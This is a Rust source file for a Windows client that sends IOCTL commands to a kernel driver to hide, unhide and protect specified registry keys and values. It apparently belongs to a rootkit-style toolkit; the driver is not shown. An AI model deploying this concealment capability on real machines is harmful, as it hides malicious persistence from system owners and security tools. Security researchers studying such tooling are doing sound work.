use crate::utils::open_driver;
use common::structs::TargetRegistry;
use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError, HANDLE},
    System::IO::DeviceIoControl,
};

/// Provides operations for managing the registry through a driver interface.
pub struct Registry {
    driver_handle: HANDLE,
}

impl Registry {
    /// Creates a new `Registry` instance, opening a handle to the driver.
    ///
    /// # Returns
    ///
    /// * An instance of `Registry`.
    ///
    /// # Panics
    ///
    /// Panics if the driver cannot be opened.
    pub fn new() -> Self {
        let driver_handle = open_driver().expect("Error");
        Registry { driver_handle }
    }

    /// Enables or disables protection for a specified registry key and value.
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for the protection operation.
    /// * `value` - A reference to the registry value name to protect.
    /// * `key` - A reference to the registry key name to protect.
    /// * `enable` - `true` to enable protection or `false` to disable it.
    pub fn registry_protection(self, ioctl_code: u32, value: &String, key: &String, enable: bool) {
        log::info!("Attempting to open the registry for protection operation");
        log::debug!(
            "Preparing structure for Key: {} | Value: {} | Protection: {}",
            key,
            value,
            if enable { "hide" } else { "unhide" }
        );
        
        // Format the key into NT format.
        let formatted_key = format_registry_key(key);
        log::info!("Formatted key: '{}'", formatted_key);
    
        let mut info_registry = TargetRegistry {
            enable,
            value: value.to_string(),
            key: formatted_key,
        };
    
        log::debug!(
            "Sending DeviceIoControl command to {} protection for key: {} | value: {}",
            if enable { "enable" } else { "disable" },
            key,
            value
        );
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut info_registry as *mut _ as *mut core::ffi::c_void,
                core::mem::size_of::<TargetRegistry>() as u32,
                core::ptr::null_mut(),
                0,
                &mut return_buffer,
                core::ptr::null_mut(),
            )
        };
    
        if status == 0 {
            log::error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            log::info!(
                "Registry protection {} for Key: {} and Value: {} succeeded",
                if enable { "enabled" } else { "disabled" },
                key,
                value
            );
        }
    }

    /// Hides or unhides a specified registry key and value.
    ///
    /// # Arguments
    ///
    /// * `ioctl_code` - The IOCTL code for the hide/unhide operation.
    /// * `value` - A reference to the registry value name to hide/unhide.
    /// * `key` - A reference to the registry key name to hide/unhide.
    /// * `enable` - `true` to hide or `false` to unhide.
    pub fn registry_hide_unhide(self, ioctl_code: u32, value: &String, key: &String, enable: bool) {
        log::info!("Attempting to open the registry for hide/unhide operation");
        log::debug!(
            "Preparing structure for Key: {} | Value: {} | Operation: {}",
            key,
            value,
            if enable { "hide" } else { "unhide" }
        );
        
        // Format the key.
        let formatted_key = format_registry_key(key);
        log::info!("Formatted key: '{}'", formatted_key);
    
        let mut info_registry = TargetRegistry {
            enable,
            key: formatted_key,
            value: value.to_string(),
            ..Default::default()
        };
    
        log::debug!(
            "Sending DeviceIoControl command to {} registry for Key: {} | Value: {}",
            if enable { "hide" } else { "unhide" },
            key,
            value
        );
        let mut return_buffer = 0;
        let status = unsafe {
            DeviceIoControl(
                self.driver_handle,
                ioctl_code,
                &mut info_registry as *mut _ as *mut core::ffi::c_void,
                core::mem::size_of::<TargetRegistry>() as u32,
                core::ptr::null_mut(),
                0,
                &mut return_buffer,
                core::ptr::null_mut(),
            )
        };
    
        if status == 0 {
            log::error!("DeviceIoControl Failed With Status: 0x{:08X}", unsafe { GetLastError() });
        } else {
            log::info!(
                "Registry with Key: {} and Value: {} successfully {}hidden",
                key,
                value,
                if enable { "" } else { "un" }
            );
        }
    }
}

impl Drop for Registry {
    /// Ensures the driver handle is closed when `Registry` goes out of scope.
    fn drop(&mut self) {
        log::debug!("Closing the driver handle");
        unsafe { CloseHandle(self.driver_handle) };
    }
}
pub fn format_registry_key(input: &str) -> String {
    // Trim whitespace.
    let trimmed = input.trim();
    if trimmed.is_empty() {
        return String::new();
    }

    // Determine the prefix and the remainder.
    // Convert the input to uppercase for prefix comparison.
    let upper = trimmed.to_uppercase();
    let (rest, prefix) = if upper.starts_with("HKLM\\") {
        (&trimmed[5..], "\\REGISTRY\\MACHINE\\")
    } else if upper.starts_with("HKU\\") {
        (&trimmed[4..], "\\REGISTRY\\USER\\")
    } else if upper.starts_with("\\REGISTRY\\") {
        // Already in NT format.
        ("", "")
    } else {
        // Default to HKLM if no known prefix.
        (trimmed, "\\REGISTRY\\MACHINE\\")
    };

    let nt_path = if prefix.is_empty() {
        trimmed.to_string()
    } else {
        format!("{}{}", prefix, rest)
    };

    // Split the NT path on '\' and remove empty segments.
    let parts: Vec<&str> = nt_path.split('\\').filter(|s| !s.is_empty()).collect();
    let mut formatted_parts = Vec::with_capacity(parts.len());
    for (i, part) in parts.iter().enumerate() {
        if i < 3 {
            // Force the first three segments to uppercase.
            formatted_parts.push(part.to_uppercase());
        } else {
            // Leave the remainder exactly as is.
            formatted_parts.push(part.to_string());
        }
    }
    // Prepend a backslash and join parts with backslashes.
    format!("\\{}", formatted_parts.join("\\"))
}